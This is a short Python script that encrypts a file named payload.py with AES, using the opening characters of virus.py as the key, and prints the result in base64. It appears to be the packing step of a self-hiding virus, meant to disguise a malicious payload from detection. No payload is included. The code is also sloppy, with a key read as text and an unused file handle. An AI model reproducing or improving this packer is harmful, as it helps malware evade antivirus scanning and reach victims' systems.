import base64, sys, os, __main__; from Crypto import Random; from Crypto.Cipher import AES; from io import StringIO

virus = open('virus.py', 'r')

intialization_vector = Random.new().read(AES.block_size)
cipher = AES.new(open('virus.py', 'r').read(24), AES.MODE_CFB, intialization_vector)
encrypted = intialization_vector + cipher.encrypt(open('payload.py').read())

virus.close()

print(base64.b64encode(encrypted))